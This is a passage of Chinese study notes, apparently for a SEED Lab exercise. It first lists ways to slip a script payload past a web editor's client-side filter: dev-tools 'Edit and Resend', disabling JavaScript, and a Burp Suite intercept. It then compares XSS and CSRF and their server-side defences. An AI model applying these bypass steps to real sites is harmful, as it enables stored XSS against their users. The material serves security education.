如果你找不到隐藏的输入框，或者编辑器逻辑太复杂，可以直接在网络层修改数据包。

**操作步骤：**

1.  打开 **F12** -> **Network (网络)** 标签页。
2.  在编辑器里随便输入一些正常的文本，比如 `TEST_MARKER`。
3.  点击“保存/提交”。
4.  在 Network 面板里找到那个 **POST 请求**（通常是第一条或者名字叫 `action`、`edit` 之类的）。
5.  **编辑并重发 (Edit and Resend)**：
    *   **Firefox**：右键该请求 -> 选择 **"Edit and Resend" (编辑并重发)**。
    *   **Chrome**：通常需要右键 -> **"Copy as fetch"** -> 在 Console (控制台) 里粘贴修改。Firefox 的体验在这一点上更好。
6.  在编辑窗口的 **Request Body (请求体)** 部分，找到你刚才输入的 `TEST_MARKER`。
7.  把它替换成你的恶意代码 `<script>...</script>`。
    *   *注意：如果是在 Console 里改 Fetch 代码，记得对特殊字符做简单的 URL 编码，或者确保引号不要闭合错误。*
8.  点击 **Send (发送)**。

---

### 方法三：禁用 JavaScript（暴力法）

很多富文本编辑器是完全依赖 JavaScript 加载的。如果禁用了 JS，网页往往会“退化”成最原始的状态，露出原始的 `<textarea>`。

**操作步骤：**

1.  在浏览器设置里**禁用 JavaScript**（或者使用插件如 NoScript，或 Firefox 开发者工具里的设置）。
2.  刷新页面。
3.  你会发现漂亮的编辑器不见了，取而代之的是一个丑陋的普通文本框。
4.  在这里直接输入 `<script>...</script>`。
5.  提交（可能需要临时重新开启 JS 才能提交，这取决于按钮是否依赖 JS。如果按钮也是普通的 submit input，那就没问题）。

---

### 方法四：使用代理工具（Burp Suite / Zed Attack Proxy）

这是专业黑客的标准做法。如果你在这个实验环境里配置了 Burp Suite，这是最推荐的方法。

**操作步骤：**

1.  开启 Burp Suite 拦截模式 (Intercept On)。
2.  在网页编辑器里正常输入 `123`，点击保存。
3.  Burp 会拦截下这个请求，卡在半空中。
4.  在 Burp 里直接把 `123` 改成 `<script>...</script>`。
5.  点击 **Forward (放行)**。

---

### 核心原理总结 (为什么这样能行？)

*   **编辑器的过滤是“防君子不防小人”**：编辑器（TinyMCE, CKEditor 等）在客户端把 `<` 变成 `&lt;`，这是为了防止普通用户把排版搞乱，或者是为了基本的格式化。
*   **真正的防御必须在服务端**：如果服务器端（PHP/Java/Python）收到数据后，没有再次进行 `htmlspecialchars()` 或者 `strip_tags()` 处理，而是直接存入数据库，那么无论客户端编辑器怎么防御，攻击者都能通过上述方法绕过。

**对于 SEED Lab**：
只要服务器端的防御代码被注释掉了（如实验文档所述），使用 **方法一（修改隐藏 DOM）** 或 **方法二（Firefox Edit and Resend）** 是最快解决战斗的方式。

# CSRF vs XSS

从“本质”上看，CSRF 和 XSS 的最大区别可以用一句话概括：

  

> **XSS：攻击者“把自己的脚本塞进你的网站里，让用户在信任的网站上执行恶意代码。”**

> **CSRF：攻击者“不控制你的网站代码，只是利用用户已经登录的身份，让浏览器替用户误操作。”**

  

下面我们分几个角度拆开讲。

---

## **1. 攻击本质：谁被“劫持”了？**

  

### **XSS（Cross-Site Scripting，跨站脚本）*
- **本质：劫持的是“页面内容 / 前端执行环境”。**
- 攻击者设法把恶意脚本注入到你信任的网站页面中，让**浏览器在该站点上下文中执行攻击者的 JS 代码**。
- 一旦脚本跑起来，它就拥有该站点下 JS 能做到的一切能力：
    - 读写当前页面的 DOM
    - 读取页面中的敏感信息（如 CSRF token、用户信息）
    - 发起同源请求（Ajax、fetch）
    - 伪造前端操作（点击、表单提交）

**关键词：代码被注入 ⇒ 前端执行环境被控制。**

---

### **CSRF（Cross-Site Request Forgery，跨站请求伪造）**
- **本质：劫持的是“用户的身份 / 浏览器的隐式信任”。**
- 攻击者不能改你的网站代码，也看不到响应内容，但能诱导用户：
    - 在已登录状态下访问一个恶意页面
    - 由这个恶意页面构造一个请求，**利用浏览器会自动带上 Cookie / Session** 的特性，向受信任网站发起敏感操作。
        
- 服务器以为“这是用户自己发的请求”，其实是攻击者引导完成的。
    
**关键词：请求被伪造 ⇒ 利用浏览器自动带身份信息。**

---

## **2. 攻击前提：攻击者需要什么？**

### **XSS 前提*：
1. 站点存在**输出没有正确转义 / 过滤**的地方（反射型、存储型、DOM 型等）。
2. 攻击者可以控制部分输入，使其最终变成页面 HTML/JS 的一部分。

**不依赖用户是否登录，也不依赖 Cookie 自动发送。**

---

### **CSRF 前提**
1. 用户已经在目标网站**登录并保持会话**（Cookie 有效）。
2. 目标网站的某些敏感接口
    - 仅依赖 Cookie / Session 进行身份认证
    - **没有额外的请求来源校验或防伪机制**（CSRF token / SameSite Cookie / Referer 验证等）。
3. 攻击者能诱导用户访问一个恶意页面（点链接、打开邮件、访问恶意站点等）。
    
**强依赖浏览器的“自动带 Cookie”行为和服务器端缺少 CSRF 防护。**

---

## **3. 能力对比：攻击者能做到什么？**

### **XSS 能力**
在注入成功且脚本执行后，攻击者在当前域下几乎是一个“前端开发者”
- 窃取敏感数据（Cookie、LocalStorage 里未设 HttpOnly 的数据、页面内容）
- 发起任意同源请求（读取响应内容）
- 伪造任意用户操作
- 构造进一步的 CSRF/Malware 攻击（XSS 经常是更大攻击链的起点）

**因此 XSS 常被认为比 CSRF 危害更大（攻击面更广）。**

---

### **CSRF 能力**
- 能在用户不知情的情况下，利用其身份向目标网站**发送请求**。
- 但是通常：
    - 不能读响应内容（跨域限制）    
    - 不能直接操作页面 DOM（因为恶意页面与目标站点不同源）
        
CSRF 主要用于：
- 修改用户资料
- 转账、下单、改密码（如果接口设计不当）
- 执行任何“只要有 Cookie 就被当成合法用户”的操作
    
**CSRF 攻击的威力完全取决于：服务器把什么敏感操作单纯建立在 Cookie 身份之上。**

---

## **4. 防御思路上的本质差异**

### **防 XSS：**

### **不要让恶意脚本进来并被执行**
核心思想：**“不信任任何输入，严格转义/过滤输出 + 限制脚本执行能力”**

典型措施：
1. 对所有用户输入做 **输出编码（HTML 转义、JS 转义、URL 编码）**。
2. 严格使用模板引擎安全输出，不拼字符串写 HTML/JS。
3. 使用 CSP（Content Security Policy）限制脚本来源、禁止 inline script。
4. 输入过滤 + 白名单校验（如富文本编辑）。
5. HttpOnly Cookie 防止通过 JS 直接窃取 Cookie。
    

---

### **防 CSRF：**
### **不要仅凭“浏览器带的 Cookie”就信任请求**
核心思想：**“请求必须有用户端确认的明确意图，而不是仅凭自动凭证。”**
典型措施
1. **CSRF Token**：表单 / Ajax 请求必须携带一个在页面生成时植入的、与会话绑定的随机 token。
2. **SameSite Cookie**：将关键 Session Cookie 设置为 SameSite=Lax/Strict，阻断第三方站点发起的跨站自动带 Cookie 请求。
3. 验证请求来源（Referer / Origin Header），在高敏感操作中使用。
4. 关键操作要求用户二次确认（验证码、短信、动态口令等）。
    

---

## **5. 经典一句话对比（面试/笔试常用）**
- **XSS：攻击者把恶意脚本“放进你的站点里”，利用浏览器执行自己的代码。**
- **CSRF：攻击者不需要控制你的站点代码，只需要“骗你的浏览器替他发请求”，利用你已有的登录状态。**
    
从本质上讲：
- **XSS 是“代码注入型”攻击（控制前端执行环境）。**
- **CSRF 是“请求伪造型”攻击（滥用身份与信任关系）。**
    
